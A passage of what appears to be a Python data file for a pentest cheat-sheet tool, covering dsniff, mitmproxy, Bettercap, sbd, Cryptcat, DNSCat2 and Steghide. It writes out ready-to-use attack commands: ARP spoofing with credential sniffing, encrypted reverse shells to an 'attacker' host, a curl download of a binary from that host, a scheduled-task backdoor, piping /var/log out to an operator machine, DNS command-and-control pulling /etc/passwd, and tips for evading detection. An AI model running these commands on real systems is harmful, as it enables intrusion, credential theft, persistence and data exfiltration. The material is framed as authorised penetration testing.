        {"flag": "-f <file>", "description": "Read targets/from file (arpspoof, dnsspoof)"},
        {"flag": "-r <pcap>", "description": "Replay traffic from PCAP instead of live network"}
    ],
    "operational_tips": [
        "Pair arpspoof/dnsspoof with urlsnarf or driftnet to demonstrate full attack chain.",
        "macof is noisy—only run on isolated lab networks or with explicit customer approval.",
        "Use the -p switch on urlsnarf/mailsnarf to keep sniffing even if promiscuous mode fails.",
        "Log file timestamps and store sanitized samples so they can be included in PT Journal." 
    ],
    "step_sequences": [
        {
            "title": "Cleartext credential sweep",
            "steps": [
                {"title": "Establish MITM", "details": "Poison gateway with arpspoof for the scoped host list.", "command": "sudo arpspoof -t 192.168.10.50 192.168.10.1"},
                {"title": "Run snarfers", "details": "Capture URLs, IMAP/POP passwords, and FTP data.", "command": "sudo urlsnarf -i eth0 > urls.log & sudo mailsnarf -i eth0 > mail.log"},
                {"title": "Summarize findings", "details": "Extract credentials and impacted systems for reporting.", "command": "grep -E 'USER|PASS' mail.log | tee creds.txt"}
            ]
        },
        {
            "title": "Switch resilience testing",
            "steps": [
                {"title": "Baseline switch", "details": "Record current CPU and port stats.", "command": "snmpwalk -v2c -c public switch IF-MIB::ifDescr"},
                {"title": "Launch macof", "details": "Overflow CAM table to force broadcast flooding.", "command": "sudo macof -i eth0 -n 200000"},
                {"title": "Observe impact", "details": "Use tcpdump/wireshark to confirm now-broadcast traffic.", "command": "sudo tcpdump -i eth0 ether broadcast"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Arpspoof → Snarf → Evidence",
            "stages": [
                {"label": "Poison", "description": "Use arpspoof/dnsspoof to intercept flows.", "command": "arpspoof -t victim gateway"},
                {"label": "Harvest", "description": "Run urlsnarf/mailsnarf/filesnarf simultaneously.", "command": "urlsnarf -i eth0 | tee urls.log"},
                {"label": "Pivot", "description": "Feed suspicious hosts into other tooling (Hydra, Metasploit).", "command": "cut -d' ' -f3 urls.log | sort -u > targets.txt"},
                {"label": "Report", "description": "Attach sanitized logs to PT Journal and note detections if any occurred.", "command": "# PT Journal → Findings → Add credential leakage"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "urlsnarf: host=internalwiki", "meaning": "Users accessing internal HTTP resources over insecure network.", "severity": "Medium"},
        {"indicator": "mailsnarf: PASS <base64>", "meaning": "Recovered IMAP/POP credentials that can be replayed.", "severity": "High"},
        {"indicator": "macof: flood complete", "meaning": "Switch CAM table likely exhausted—monitor for IDS alerts.", "severity": "Info"}
    ],
    "advanced_usage": [
        {"title": "PCAP replay for testing", "command": "urlsnarf -r captive-portal.pcap", "scenario": "Demonstrate dsniff findings using sanitized captures instead of customer traffic.", "notes": ["Great for tabletop or training sessions."]},
        {"title": "Custom dnsspoof zone", "command": "dnsspoof -i eth0 -f spoof.hosts", "scenario": "Force clients to malicious infrastructure during phishing simulations.", "notes": ["Combine with sslstrip replacements like Bettercap HSTS bypass."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "dsniff GitHub", "url": "https://github.com/tecknicon/dsniff", "description": "Community-maintained fork with patches."},
        {"label": "Original documentation", "url": "https://www.monkey.org/~dugsong/dsniff/", "description": "Classic README covering each tool in the suite."},
        {"label": "Cheatsheet", "url": "https://highon.coffee/blog/dsniff-cheatsheet/", "description": "Command summary for the individual utilities."}
    ]
}
updates['mitmproxy'] = {
    "id": "mitmproxy",
    "name": "mitmproxy",
    "summary": "mitmproxy is an interactive HTTPS proxy with scripting support for inspecting, replaying, and modifying client/server traffic.",
    "installation_guides": [
        {
            "platform": "Python/pip",
            "summary": "Install mitmproxy inside a virtual environment",
            "steps": [
                {"detail": "python3 -m venv ~/.venvs/mitmproxy", "copyable": True},
                {"detail": "~/.venvs/mitmproxy/bin/pip install --upgrade pip mitmproxy", "copyable": True},
                {"detail": "~/.venvs/mitmproxy/bin/mitmproxy --version", "copyable": True}
            ]
        },
        {
            "platform": "Kali/Ubuntu",
            "summary": "Use distro package for quick start",
            "steps": [
                {"detail": "sudo apt install -y mitmproxy", "copyable": True},
                {"detail": "mitmproxy --set console_eventlog_verbosity=info", "copyable": True}
            ]
        },
        {
            "platform": "Docker",
            "summary": "Run isolated instance for demos",
            "steps": [
                {"detail": "docker run --rm -it -p 8080:8080 -p 8081:8081 mitmproxy/mitmproxy", "copyable": True},
                {"detail": "curl -x http://127.0.0.1:8080 http://example.com", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Interactive proxy", "command": "mitmproxy -p 8080", "notes": ["Point browser/device at proxy and install mitmproxy CA cert."]},
        {"description": "Save flows", "command": "mitmdump -p 8080 -w capture.mitm", "notes": ["Use mitmweb --server to replay flows visually."]},
        {"description": "Rewrite header", "command": "mitmproxy --set header.replace:User-Agent=PTJ-Lab", "notes": ["Quick way to test WAFs and API behavior."]}
    ],
    "common_flags": [
        {"flag": "-p <port>", "description": "HTTP(S) proxy listening port"},
        {"flag": "-w file", "description": "Write captured flows"},
        {"flag": "-r file", "description": "Replay saved flows"},
        {"flag": "--mode reverse:http://target", "description": "Reverse proxy mode"}
    ],
    "operational_tips": [
        "Export the mitmproxy CA certificate (mitmproxy --export-cert) and store it with engagement artifacts.",
        "Use mitmweb for non-technical stakeholders—it provides clickable summaries and timeline charts.",
        "Write simple Python addons to automate repetitive tampering (token swap, header injection, etc.)."
    ],
    "step_sequences": [
        {
            "title": "API fuzzing with mitmproxy",
            "steps": [
                {"title": "Intercept baseline traffic", "details": "Route API client through mitmproxy and record flows.", "command": "mitmdump -p 8080 -w api-baseline.mitm"},
                {"title": "Modify requests", "details": "Use `~q` filter to select requests and edit payloads.", "command": "# In TUI: press e to edit request body"},
                {"title": "Replay variations", "details": "Clone flows and send mutated payloads.", "command": "mitmproxy → Flow list → a (duplicate) → r (replay)"}
            ]
        },
        {
            "title": "Mobile application inspection",
            "steps": [
                {"title": "Install root CA", "details": "Push mitmproxy-ca-cert.cer to device trust store.", "command": "adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/"},
                {"title": "Capture session", "details": "Proxy device through attacker workstation.", "command": "mitmproxy -p 8080 --set block_global=false"},
                {"title": "Export evidence", "details": "Save flows to file and attach to report.", "command": "mitmproxy → w → mobile-session.mitm"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Proxy → Modify → Report",
            "stages": [
                {"label": "Proxy setup", "description": "Configure browser/mobile device to trust mitmproxy.", "command": "mitmproxy --listen-host 0.0.0.0 -p 8080"},
                {"label": "Interact", "description": "Browse application, mark vulnerable flows.", "command": "# Use tagging (Shift+space) for interesting requests"},
                {"label": "Automate", "description": "Write short addon to reproduce issue reliably.", "command": "mitmdump -s exploit.py -r vulnerable.mitm"},
                {"label": "Document", "description": "Export curl/httpie commands and embed in PT Journal.", "command": "mitmproxy export curl --flow 5"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "certificate pinning error", "meaning": "Client refused proxy CA—plan for bypass or instrumentation.", "severity": "Medium"},
        {"indicator": "401 Unauthorized followed by 200", "meaning": "Authentication bypass or replay succeeded.", "severity": "High"},
        {"indicator": "Large binary response", "meaning": "Download API/exposed storage; capture hash for evidence.", "severity": "Info"}
    ],
    "advanced_usage": [
        {"title": "Addon-based autorouting", "command": "mitmdump -s addons/inject_header.py", "scenario": "Inject headers/tokens automatically for every request to a scope hostname.", "notes": ["Addons run on both request and response hooks."]},
        {"title": "Reverse proxy mode", "command": "mitmproxy --mode reverse:https://api.example.com/ -w reverse.mitm", "scenario": "Drop into inline testing when upstream TLS pinning cannot be disabled.", "notes": ["Great in front of staging APIs or for SSRF proof-of-concepts."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Official docs", "url": "https://docs.mitmproxy.org/stable/", "description": "Configuration, shortcuts, and addon API."},
        {"label": "mitmproxy examples", "url": "https://github.com/mitmproxy/mitmproxy/tree/master/examples", "description": "Addon samples for automation."},
        {"label": "Bypassing certificate pinning", "url": "https://book.hacktricks.xyz/mobile-apps-pentesting/intercepting-communications", "description": "Techniques for mobile testing with mitmproxy."}
    ]
}
updates['bettercap'] = {
    "id": "bettercap",
    "name": "Bettercap",
    "summary": "Bettercap is a modular network reconnaissance and attack framework with caplets for WiFi/BTLE sniffing, spoofing, and MITM automation.",
    "installation_guides": [
        {
            "platform": "Go install",
            "summary": "Build Bettercap from source for latest features",
            "steps": [
                {"detail": "go install github.com/bettercap/bettercap@latest", "copyable": True},
                {"detail": "$HOME/go/bin/bettercap -h", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Use packaged version plus caplet repo",
            "steps": [
                {"detail": "sudo apt install -y bettercap capstone libusb-1.0-0-dev", "copyable": True},
                {"detail": "bettercap -eval 'caplets.update; ui.update'", "copyable": True}
            ]
        },
        {
            "platform": "Raspberry Pi",
            "summary": "Deploy portable rogue AP toolkit",
            "steps": [
                {"detail": "curl -L https://get.bettercap.org | sudo bash", "copyable": True},
                {"detail": "sudo bettercap -iface wlan0", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Start interactive session", "command": "sudo bettercap -iface eth0", "notes": ["Use `help` within console to list modules."]},
        {"description": "Run caplet", "command": "sudo bettercap -caplet hstshijack", "notes": ["Caplets automate scriptable workflows (DNS spoofing, SSL stripping)."]},
        {"description": "Web UI", "command": "sudo bettercap -iface wlan0 -caplet http-ui", "notes": ["Exposes dashboard on https://127.0.0.1:8083/" ]}
    ],
    "common_flags": [
        {"flag": "-iface <name>", "description": "Network interface"},
        {"flag": "-caplet file", "description": "Execute predefined caplet"},
        {"flag": "-eval '<cmd>'", "description": "Run commands inline"},
        {"flag": "-script <lua>", "description": "Load Lua automation"}
    ],
    "operational_tips": [
        "Sync caplets regularly: `caplets.update; ui.update`.",
        "Use `events.stream on` to push logs to external syslog targets.",
        "Prefer `net.probe on` for quiet recon before enabling ARP spoofing modules.",
        "Document executed caplets and parameters to reproduce results later." 
    ],
    "step_sequences": [
        {
            "title": "HSTS bypass run",
            "steps": [
                {"title": "Enable wifi recon", "details": "Discover clients/APs before attacking.", "command": "wifi.recon on"},
                {"title": "Launch MITM", "details": "Spoof DNS and strip TLS.", "command": "set http.proxy.sslstrip true; set dns.spoof.domains *; dns.spoof on"},
                {"title": "Collect creds", "details": "Monitor events log and export JSON.", "command": "events.show http.proxy"}
            ]
        },
        {
            "title": "BLE assessment",
            "steps": [
                {"title": "Scan BLE devices", "details": "Identify advertisements.", "command": "ble.recon on"},
                {"title": "Sniff characteristic", "details": "Subscribe to notifications.", "command": "ble.spoof on; ble.subscribe CC:EE:CC:EE:AA:01"},
                {"title": "Replay payload", "details": "Send crafted packets.", "command": "ble.write 0x000b cafe"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Bettercap engagement rhythm",
            "stages": [
                {"label": "Recon", "description": "wifi.recon / net.show to map environment.", "command": "bettercap -iface wlan0 -eval 'net.show; wifi.recon on'"},
                {"label": "Exploit", "description": "Execute caplets (hstshijack, dns_spoof).", "command": "caplets.show"},
                {"label": "Harvest", "description": "Stream event log to file for reporting.", "command": "events.log ~/evidence/bettercap.log"},
                {"label": "Cleanup", "description": "Disable spoofing, toggle modules off, archive config.", "command": "net.probe off; arp.spoof off; caplets.save session.cap"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "http.proxy (creds)", "meaning": "Credentials intercepted; redact before sharing.", "severity": "High"},
        {"indicator": "wifi.client A0:XX", "meaning": "New station joined; monitor for rogue devices.", "severity": "Info"},
        {"indicator": "events.error dns.spoof", "meaning": "Spoof failed—likely DNSSEC or responder blocking.", "severity": "Medium"}
    ],
    "advanced_usage": [
        {"title": "Headless REST API", "command": "bettercap -rest 127.0.0.1:8081 -iface eth0", "scenario": "Control Bettercap remotely via HTTP API or Web UI.", "notes": ["Protect with auth tokens; disable when done."]},
        {"title": "Custom caplet", "command": "cat > custom.cap <<'EOC'\nset net.sniff.output custom.pcap\nset http.proxy.sslstrip true\nnet.sniff on\nEOC", "scenario": "Bundle repeatable logic in version-controlled caplets.", "notes": ["Store under ~/.bettercap/caplets" ]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Bettercap docs", "url": "https://www.bettercap.org/usage/", "description": "Command reference and caplet format."},
        {"label": "Caplet index", "url": "https://github.com/bettercap/caplets", "description": "Community-maintained attack scripts."},
        {"label": "Bettercap Academy", "url": "https://www.bettercap.org/training/", "description": "Official walkthroughs and labs."}
    ]
}
updates['sbd'] = {
    "id": "sbd",
    "name": "sbd",
    "summary": "sbd (Secure Backdoor) is an encrypted netcat alternative for staged shells and pivoting when simple TCP listeners are blocked.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install from repositories",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y sbd", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Generate static binaries for dropper use",
            "steps": [
                {"detail": "sudo apt install -y sbd mingw-w64", "copyable": True},
                {"detail": "sbd -h", "copyable": True}
            ]
        },
        {
            "platform": "Source build",
            "summary": "Compile customized version",
            "steps": [
                {"detail": "git clone https://github.com/portcullislabs/sbd.git", "copyable": True},
                {"detail": "cd sbd && make linux", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "TLS listener", "command": "sbd -l -p 4443 -k supersecret", "notes": ["Creates encrypted bind shell"]},
        {"description": "Connect to listener", "command": "sbd attacker.example.com 4443 -k supersecret", "notes": ["AES-128 encrypts traffic"]},
        {"description": "Command execution", "command": "sbd -l -p 8081 -k key -e /bin/bash", "notes": ["-e executes program upon connect"]}
    ],
    "common_flags": [
        {"flag": "-l", "description": "Listen (server) mode"},
        {"flag": "-p <port>", "description": "TCP port"},
        {"flag": "-k <pass>", "description": "Shared key for encryption"},
        {"flag": "-e <cmd>", "description": "Execute program"},
        {"flag": "-v", "description": "Verbose output"}
    ],
    "operational_tips": [
        "Share keys over out-of-band channels; sbd does not implement PKI.",
        "Use -c to enable compression when tunneling over high-latency links.",
        "Drop binaries in /tmp and wipe after session to avoid detection.",
        "Run through socat/proxychains for additional obfuscation." 
    ],
    "step_sequences": [
        {
            "title": "Reverse shell fallback",
            "steps": [
                {"title": "Prepare listener", "details": "Launch encrypted listener on operator box.", "command": "sbd -l -p 3444 -k wintermute -e /bin/bash"},
                {"title": "Deploy payload", "details": "Upload sbd binary to target and execute.", "command": "./sbd attacker 3444 -k wintermute -e /bin/bash"},
                {"title": "Stabilize", "details": "Upgrade to PTY and log session.", "command": "script -qc /bin/bash sbd-session.log"}
            ]
        },
        {
            "title": "Pivoting over TLS",
            "steps": [
                {"title": "Forward internal ports", "details": "Chain sbd with ssh/proxychains.", "command": "sbd -l -p 5555 -k pivot --exec 'ssh -N -L 3389:target:3389 jump'"},
                {"title": "Connect from foothold", "details": "Use shared secret to open tunnel.", "command": "sbd operator 5555 -k pivot"},
                {"title": "Document", "details": "Record commands + timeline in PT Journal.", "command": "# PT Journal → Notes → Pivot details"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Foothold → sbd pivot → escalation",
            "stages": [
                {"label": "Deploy", "description": "Drop sbd binary via existing shell.", "command": "curl http://attacker/sbd -o /tmp/sbd && chmod +x /tmp/sbd"},
                {"label": "Tunnel", "description": "Establish encrypted reverse shell.", "command": "/tmp/sbd attacker 443 -k scope -e /bin/bash"},
                {"label": "Escalate", "description": "Use stable channel to run linpeas/winpeas.", "command": "./linpeas.sh | tee peas.log"},
                {"label": "Cleanup", "description": "Remove binaries and logs when engagement concludes.", "command": "rm -f /tmp/sbd"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Cipher negotiation failed", "meaning": "Keys mismatch—double-check passphrase.", "severity": "Medium"},
        {"indicator": "Connection reset", "meaning": "Likely security tool killed the session; rotate port or wrap in HTTPS.", "severity": "High"},
        {"indicator": "Session closed", "meaning": "Peer exited; confirm cleanup succeeded.", "severity": "Info"}
    ],
    "advanced_usage": [
        {"title": "Windows payload", "command": "x86_64-w64-mingw32-gcc sbd.c -o sbd.exe -lws2_32", "scenario": "Compile native Windows client.", "notes": ["Strip symbols with upx -9 sbd.exe"]},
        {"title": "Chained encryption", "command": "openssl s_client -quiet -connect attacker:443 | sbd 127.0.0.1 4444 -e /bin/sh", "scenario": "Hide sbd inside TLS-wrapped tunnel.", "notes": ["Useful when outbound connections inspected."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Project page", "url": "https://github.com/portcullislabs/sbd", "description": "Source and documentation."},
        {"label": "Encrypted netcat cheat sheet", "url": "https://highon.coffee/blog/reverse-shell-cheat-sheet/", "description": "Compares sbd with socat/ncat."},
        {"label": "Secure pivoting guide", "url": "https://ired.team/offensive-security-experiments/offensive-security-cheetsheets", "description": "Pivot techniques referencing sbd."}
    ]
}
updates['cryptcat'] = {
    "id": "cryptcat",
    "name": "Cryptcat",
    "summary": "Cryptcat is a drop-in encrypted replacement for netcat supporting Twofish/AES, UDP mode, and IPv6 for covert channels.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install from repositories",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y cryptcat", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Use preinstalled binary",
            "steps": [
                {"detail": "which cryptcat", "copyable": True},
                {"detail": "cryptcat -h", "copyable": True}
            ]
        },
        {
            "platform": "Windows (Cygwin)",
            "summary": "Drop compiled cryptcat.exe",
            "steps": [
                {"detail": "curl -O https://sourceforge.net/projects/cryptcat/files/latest/download", "copyable": True},
                {"detail": "certutil -hashfile cryptcat.exe SHA256", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Encrypted bind shell", "command": "cryptcat -l -p 9001 -k winter -e /bin/sh", "notes": ["Twofish encryption protects payloads."]},
        {"description": "UDP callback", "command": "cryptcat attacker 9001 -k winter -u", "notes": ["Useful where TCP inspection is strict."]},
        {"description": "File transfer", "command": "cryptcat -l -p 2222 -k foo > file.bin", "notes": ["Send side: `cryptcat host 2222 -k foo < file.bin`."]}
    ],
    "common_flags": [
        {"flag": "-l", "description": "Listen mode"},
        {"flag": "-p", "description": "Port"},
        {"flag": "-k", "description": "Shared secret"},
        {"flag": "-e", "description": "Execute command"},
        {"flag": "-u", "description": "UDP mode"}
    ],
    "operational_tips": [
        "Cryptcat uses Twofish in CFB—share key carefully and rotate often.",
        "Combine with socat/ssh to blend into existing tunnels.",
        "On Windows, use -c to disable console buffering and avoid truncated output.",
        "Record transcripts (script/tmux logging) for audit trails." 
    ],
    "step_sequences": [
        {
            "title": "Windows persistence helper",
            "steps": [
                {"title": "Upload binary", "details": "Drop cryptcat.exe into C:\\Windows\\Temp.", "command": "copy cryptcat.exe C:\\Windows\\Temp\\cc.exe"},
                {"title": "Install service", "details": "Create scheduled task to launch at reboot.", "command": "schtasks /Create /SC ONLOGON /TN ccbackdoor /TR 'C:\\Windows\\Temp\\cc.exe attacker 443 -k scope -e cmd.exe'"},
                {"title": "Monitor", "details": "Keep handler running with tmux logging.", "command": "tmux pipe-pane -o 'cat >> cryptcat.log'"}
            ]
        },
        {
            "title": "Covert file exfil",
            "steps": [
                {"title": "Start listener", "details": "Listen with key + compression.", "command": "cryptcat -l -p 7777 -k archive -z > archive.tar.gz"},
                {"title": "Send data", "details": "Pipe tarball over cryptcat.", "command": "tar czf - /var/log | cryptcat operator 7777 -k archive"},
                {"title": "Verify integrity", "details": "Hash files and attach to PT Journal evidence.", "command": "sha256sum archive.tar.gz"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Dropper → Encrypted channel → Cleanup",
            "stages": [
                {"label": "Deploy", "description": "Copy cryptcat to target host.", "command": "scp cryptcat root@victim:/tmp/cc"},
                {"label": "Connect", "description": "Start/receive encrypted shell.", "command": "cryptcat -l -p 6000 -k client -e /bin/bash"},
                {"label": "Operate", "description": "Conduct actions-on-objective via stable channel.", "command": "# run privesc scripts, data staging"},
                {"label": "Destroy", "description": "Delete binaries and rotate keys.", "command": "rm -f /tmp/cc"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "cryptcat: bad key", "meaning": "Shared secret mismatch or truncated entry.", "severity": "Medium"},
        {"indicator": "Connection timed out", "meaning": "Firewall killed idle session; enable keepalive (send heartbeats).", "severity": "Info"},
        {"indicator": "Buffer overflow warning", "meaning": "Transferring large file over UDP can drop data—switch to TCP.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "IPv6 channels", "command": "cryptcat -l -p 9001 -k hex -6", "scenario": "Bypass IPv4 ACLs by tunneling over IPv6.", "notes": ["Verify dual-stack connectivity first."]},
        {"title": "Proxy integration", "command": "proxychains cryptcat target 443 -k stealth", "scenario": "Blend cryptcat within TOR/SOCKS for additional anonymity.", "notes": ["Set proxy_dns in proxychains.conf"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Cryptcat Sourceforge", "url": "https://cryptcat.sourceforge.net/", "description": "Official downloads and documentation."},
        {"label": "Encrypted shells overview", "url": "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet", "description": "Comparison between nc, sbd, ncat, cryptcat."},
        {"label": "Blue team detections", "url": "https://www.sans.org/blog/detecting-encrypted-shells/", "description": "Help articulate detection gaps in reports."}
    ]
}
updates['dnscat2'] = {
    "id": "dnscat2",
    "name": "DNSCat2",
    "summary": "DNSCat2 provides a command-and-control channel that tunnels shells, file transfers, and port forwarding through DNS queries.",
    "installation_guides": [
        {
            "platform": "Server (Ruby)",
            "summary": "Set up dnscat2 server with Ruby and Bundler",
            "steps": [
                {"detail": "sudo apt install -y ruby bundler", "copyable": True},
                {"detail": "git clone https://github.com/iagox86/dnscat2.git", "copyable": True},
                {"detail": "cd dnscat2/server && bundle install", "copyable": True}
            ]
        },
        {
            "platform": "Client (Linux)",
            "summary": "Compile C client",
            "steps": [
                {"detail": "cd dnscat2/client", "copyable": True},
                {"detail": "make", "copyable": True},
                {"detail": "./dnscat --help", "copyable": True}
            ]
        },
        {
            "platform": "Windows PowerShell client",
            "summary": "Use prebuilt scripts on compromised hosts",
            "steps": [
                {"detail": "powershell -ExecutionPolicy Bypass -File dnscat2.ps1", "copyable": True},
                {"detail": "Invoke-Dnscat2 -Domain c2.example.com", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Start server", "command": "ruby dnscat2.rb --dns domain=c2.example.com", "notes": ["Point NS records of c2.example.com to server IP."]},
        {"description": "Launch client", "command": "./dnscat --dns domain=c2.example.com", "notes": ["Creates interactive session in server console."]},
        {"description": "Run PowerShell implant", "command": "Invoke-Dnscat2 -Domain c2.example.com -Command 'launch calc'", "notes": ["Use when only Windows access available."]}
    ],
    "common_flags": [
        {"flag": "--dns server=x.x.x.x", "description": "Specify DNS server"},
        {"flag": "--dns domain=example.com", "description": "Authoritative domain used for C2"},
        {"flag": "--secret <key>", "description": "Shared secret for session"},
        {"flag": "--exec <cmd>", "description": "Execute command on session start"}
    ],
    "operational_tips": [
        "Use short TTLs and dedicated domain to avoid interfering with real production records.",
        "Rotate secrets frequently; dnscat2 sessions are not end-to-end encrypted by default.",
        "Throttle clients with --delay to mimic legitimate DNS chatter.",
        "Document any DNS changes (NS records, zones) in PT Journal for rollback." 
    ],
    "step_sequences": [
        {
            "title": "Deploying DNS C2",
            "steps": [
                {"title": "Configure DNS", "details": "Delegate c2.example.com to server.", "command": "nsupdate <<'EON'\nupdate add c2.example.com 3600 NS ns1.attacker.com\nsend\nEON"},
                {"title": "Start server", "details": "Run dnscat2 with logging.", "command": "ruby dnscat2.rb --dns domain=c2.example.com --secret blue -l logs/session.log"},
                {"title": "Launch client", "details": "Execute binary/script on compromised host.", "command": "./dnscat --dns domain=c2.example.com --secret blue"}
            ]
        },
        {
            "title": "File transfer via DNS",
            "steps": [
                {"title": "Open session", "details": "Use server console to interact with channel.", "command": "session -i 1"},
                {"title": "Start file mode", "details": "Switch to file transfer.", "command": "download /etc/passwd"},
                {"title": "Verify", "details": "Ensure hash matches and attach to evidence.", "command": "sha256sum downloads/passwd"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Phish → DNS beacon → Control",
            "stages": [
                {"label": "Deliver", "description": "Send phishing payload that runs dnscat2 client.", "command": "powershell -Command Invoke-Dnscat2"},
                {"label": "Beacon", "description": "DNS traffic reaches authoritative server and registers session.", "command": "session -l"},
                {"label": "Task", "description": "Run shell, port forward, or file transfer.", "command": "shell --id 2"},
                {"label": "Cleanup", "description": "Kill sessions and remove NS delegation post-engagement.", "command": "session -k 2"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "[session 1] opened", "meaning": "Client successfully connected.", "severity": "Info"},
        {"indicator": "AUTH ERROR", "meaning": "Secret mismatch or replay attempt detected.", "severity": "High"},
        {"indicator": "Too many pending packets", "meaning": "Channel saturated—tune --maxlength or deploy additional domains.", "severity": "Medium"}
    ],
    "advanced_usage": [
        {"title": "SOCKS proxy over DNS", "command": "session -i 1; socks 1080", "scenario": "Route traffic from operator machine through compromised host via DNS tunnel.", "notes": ["Combine with proxychains for tooling reuse."]},
        {"title": "Staging multiple domains", "command": "ruby dnscat2.rb --dns domain=ops.example --dns domain=backup.example", "scenario": "Provide redundancy in case one domain is blocked.", "notes": ["Keep TTLs low for fast failover."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Project repo", "url": "https://github.com/iagox86/dnscat2", "description": "Source, documentation, scripts."},
        {"label": "Subdomain delegation primer", "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns", "description": "Guidance on DNS records for tunneling."},
        {"label": "Blue team detection", "url": "https://www.sans.org/blog/detecting-dns-tunneling/", "description": "Use in reporting to explain mitigations."}
    ]
}
updates['steghide'] = {
    "id": "steghide",
    "name": "Steghide",
    "summary": "Steghide hides and extracts data inside images or audio files while supporting passphrase encryption and integrity checks.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install from official repositories",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y steghide", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Already packaged with wordlists",
            "steps": [
                {"detail": "steghide --version", "copyable": True},
                {"detail": "ls /usr/share/wordlists/rockyou.txt.gz", "copyable": True}
            ]
        },
        {
            "platform": "macOS (Homebrew)",
            "summary": "Install via brew",
            "steps": [
                {"detail": "brew install steghide", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Embed secret file", "command": "steghide embed -cf cover.jpg -ef secret.txt -sf secret.jpg -p pass123", "notes": ["-cf cover file, -ef embedded file, -sf stego output"]},
        {"description": "Extract payload", "command": "steghide extract -sf secret.jpg -p pass123", "notes": ["Writes file to current directory"]},
        {"description": "List info", "command": "steghide info secret.jpg", "notes": ["Shows embedded file names if passphrase known"]}
    ],
    "common_flags": [
        {"flag": "embed/extract/info", "description": "Operation modes"},
        {"flag": "-cf / -sf", "description": "Cover file / stego file"},
        {"flag": "-ef", "description": "File to embed"},
        {"flag": "-p", "description": "Passphrase"},
        {"flag": "-z", "description": "Compression level"}
    ],
    "operational_tips": [
        "Use lossless formats (BMP/WAV) when possible—JPEG adds noise that can corrupt payloads.",
        "Document hashes of both cover and stego files to prove authenticity.",
        "Use wordlists + steghide brute force (stegcracker) when auditing client-supplied evidence.",
        "Always remove metadata from cover images to avoid tipping off defenders." 
    ],
    "step_sequences": [
        {
            "title": "Embedding workflow",
            "steps": [
                {"title": "Choose cover", "details": "Select high-entropy image.", "command": "identify -verbose cover.jpg | grep Colors"},
                {"title": "Embed file", "details": "Use strong passphrase.", "command": "steghide embed -cf cover.jpg -ef creds.csv -sf cover-creds.jpg -p 'Complex!Pass'"},
                {"title": "Validate", "details": "Extract to confirm integrity.", "command": "steghide extract -sf cover-creds.jpg -p 'Complex!Pass'"}
            ]
        },
        {
            "title": "Incident response (extraction)",
            "steps": [
                {"title": "Identify suspect files", "details": "List media from evidence share.", "command": "find evidence/ -iname '*.jpg'"},
                {"title": "Attempt extraction", "details": "Use known passphrase or dictionary.", "command": "steghide extract -sf evidence/img1.jpg -p Company2023"},
                {"title": "Document", "details": "Record success/failure and hash outputs.", "command": "sha256sum extracted/*"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Payload prep → Stego delivery → Validation",
            "stages": [
                {"label": "Prepare", "description": "Compress + encrypt sensitive data.", "command": "tar czf payload.tgz data/ && gpg -c payload.tgz"},
                {"label": "Hide", "description": "Embed encrypted blob into benign media.", "command": "steghide embed -cf brochure.png -ef payload.tgz.gpg -sf brochure-final.png"},
                {"label": "Deliver", "description": "Send stego file through approved channel.", "command": "scp brochure-final.png client:/evidence"},
                {"label": "Verify", "description": "Provide passphrase + extraction procedure to stakeholders.", "command": "steghide extract -sf brochure-final.png"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "embedding algorithm: Rijndael-128", "meaning": "Encryption active; cite cipher in report.", "severity": "Info"},
        {"indicator": "capacity exceeded", "meaning": "Cover file too small for payload; choose larger file.", "severity": "Medium"},
        {"indicator": "wrong passphrase", "meaning": "Extraction failed—verify secret or attempt brute force.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Dictionary attacks", "command": "stegcracker secret.jpg rockyou.txt", "scenario": "Audit client incident evidence for hidden payloads.", "notes": ["Require python3 and steghide installed"]},
        {"title": "Batch embedding", "command": "for img in *.jpg; do steghide embed -cf $img -ef payload.bin -sf embeds/$img -p key; done", "scenario": "Automate generation of multiple stego files.", "notes": ["Track mapping of cover→payload."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Steghide docs", "url": "https://steghide.sourceforge.net/documentation.php", "description": "Official manual."},
